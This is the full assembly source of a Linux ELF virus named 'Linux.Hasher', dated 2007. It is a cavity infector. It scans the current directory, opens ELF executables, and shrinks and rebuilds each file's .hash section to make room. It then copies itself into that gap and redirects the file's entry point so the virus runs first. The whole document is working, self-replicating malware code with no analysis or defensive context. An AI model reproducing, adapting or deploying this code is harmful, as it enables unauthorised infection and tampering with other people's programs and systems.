   ; Linux.Hasher (x) 2007, herm1t <herm1t@vx.netlux.org>
   ; Features:
   ;  - cavity infector, shrink .hash section, file size will not be increased
   ;  - no delta, address of the virus saved in the body upon infection
   %macro movb 2
       %if %2 == 0
           xor     %1, %1
       %else
               push    byte %2
               pop     %1
       %endif
   %endmacro
           BITS    32
           CPU 486
           global  _start
   _start:     push    strict dword fake_host
           pusha
           enter   268,0           ; sizeof(dirent)
           push    '.'
           mov ebx, esp
           movb    eax, 5
           movb    ecx, 0
           int 0x80
           or  eax, eax
           js  .vr
           xchg    eax, ebx
   .rd:        mov ecx, esp
           movb    eax, 89
           int 0x80
           dec eax
           jz  infect
   .vc:        movb    eax, 6
           int 0x80
   .vr:        leave
           popa
                   ret

   infect:     pusha
           mov al, 5
           lea ebx, [esp + 32 + 10]    ; d_name
           movb    ecx, 2
           int 0x80
           or  eax, eax
           js  .ir
           push    eax
           xchg    eax, ebx

                   movb    eax, 19
           mov edx, ecx
           sub ecx, ecx
           int 0x80
           push    eax
           xchg    eax, edx

           pusha
           mov ecx, edx
           mov edi, ebx
           mov al, 192
           xor     ebx, ebx
           movb    edx, 3
           movb    esi, 1
           xor     ebp, ebp
           int     0x80
           mov [esp + 28], eax
           bswap   eax
           inc ax          ; > 0xffff0000
           popa
           jz  .ic
           xchg    eax, esi

           mov eax, dword [esi]    ; ? 0x464c457f
           xor eax, dword [esi + 16]   ; ? 0x00030002
           add eax, 0xb9b0ba83
           jnz .iu
           cmp al, [esi + 15]
           jne .iu
           inc byte [esi + 15]

           xor ebx, ebx        ; hash
           xor edx, edx        ; dynsym
           mov edi, [esi + 32]     ; e_shoff
           add edi, esi
           movzx   ecx, word [esi + 48]    ; e_shnum
   .hl:        cmp dword [edi + 4], 5  ; sh_type == SHT_HASH
           jne .h1
           mov ebx, edi
   .h1:        cmp dword [edi + 4], 11 ; sh_type == SHT_DYNSYM
           jne .h2
           mov edx, edi
   .h2:        add edi, 40
           loop    .hl
           mov eax, ebx
           and eax, edx
           jnz .fh

   .iu:        movb    eax, 91
           mov ebx, esi
           pop ecx         ; length
           int 0x80
   .ic:        movb    eax, 6
           pop ebx         ; handle
           int 0x80
   .ir:        popa
           jmp _start.rd

   .fh:        mov edi, [ebx + 16]     ; hash.sh_offset
           add edi, esi
           mov ecx, [edi + 0]      ; nbuckets
           mov ebp, [edi + 4]      ; nchains
           sub ecx, (_size + 3) / 4
           js  .iu

           ; ebx - hash shdr
           ; ecx - new nbuckets
           ; edx - dynsym shdr
           ; edi - hash ptr
           ; ebp - nchains

           ; clean hash
           pusha
           mov ecx, [ebx + 20]     ; s_hash.sh_size
           xor eax, eax
           rep stosb
           popa

           push    ebx
           mov ebx, [edx + 24]     ; dynsym.sh_link
           lea ebx, [ebx * 4 + ebx]
           lea ebx, [ebx * 8]      ; * sizeof(Elf32_Shdr)
           mov eax, [esi + 32]     ; e_shoff
           add eax, esi        ; SHT
           lea ebx, [eax + ebx]    ; dynstr (shdr)
           mov ebx, [ebx + 16]     ; dynstr.sh_offset
           add ebx, esi
           push    ebx         ; + dynstr
           mov edx, [edx + 16]     ; dynsym.sh_offset
           add edx, esi
           push    edx         ; + dynsym
           push    ebp         ; + nchains
           push    ecx         ; + new nbuckets
           push    edi         ; + hash
           call    build_hash
           pop ebx

           ; copy virus body
           mov edx, [edi + 0]      ; nbuckets
           add edx, [edi + 4]      ; nchains
           inc edx         ; + 2
           inc edx
           shl edx, 2          ; * 4
           ; edx - virus offset within .hash
           pusha
           add edi, edx
           mov ecx, _size
           mov esi, strict dword _start
   _self       equ $-_start-4
           rep movsb
           popa

           mov eax, [esi + 24]     ; e_entry
           mov [edi + edx + 1], eax    ; save old entry
           mov eax, [ebx + 12]     ; sh_addr
           add eax, edx
           mov [edi + edx + _self], eax
           mov [esi + 24], eax     ; e_entry
           jmp .iu

   elf_hash:   pusha
           cld
           xor eax, eax
           xor edx, edx    ; edx - h
           mov esi, [esp + 36] ; name

       .next:  lodsb
           or  eax, eax
           jz  .done

           shl edx, 4
           add edx, eax

           mov ebx, edx
           and ebx, 0xf0000000
           jz  .skip
           mov ecx, ebx
           shr ecx, 24
           xor edx, ecx
       .skip:
           not ebx
           and edx, ebx

           jmp .next

       .done:  mov [esp + 28], edx
           popa
           retn    4

   build_hash: pusha
           cld
           mov edi, [esp + 36]     ; hash
           mov eax, [esp + 40]     ; nbuckets
           stosd
           xchg    eax, ecx
           mov eax, [esp + 44]     ; nchains
           stosd
           xchg    eax, ebp
           lea esi, [edi + ecx * 4]    ; chains
           xor ebx, ebx
           inc ebx
           ; ebx - i
           ; ecx - nbuckets
           ; esi - chains
           ; edi - buckets
           ; ebp - nchains
       .for:   mov eax, [esp + 48]     ; sym
           mov edx, ebx
           shl edx, 4          ; edx = i * sizeof(Elf32_Sym)
           mov eax, [eax + edx]    ; sym[i].st_name
           add eax, [esp + 52]     ; str

           push    eax
           call    elf_hash
           ; eax - h
           xor edx, edx
           div ecx
           ; edx = elf_hash(str + sym[i].st_name) % nbuckets;

           mov eax, [edi + edx * 4]
           or  eax, eax
           jnz .else

               mov [edi + edx * 4], ebx
               jmp .endif

       .else:  mov edx, [edi + edx * 4]

       .while: mov eax, [esi + edx * 4]
           or  eax, eax
           jz  .end_while
           mov edx, [esi + edx * 4]
           jmp .while
       .end_while:
           mov [esi + edx * 4], ebx
       .endif:
           inc ebx
           cmp ebx, ebp
           jb  .for

           popa
           retn    20
   _size       equ $-_start

   fake_host:  mov eax,1
           int 0x80
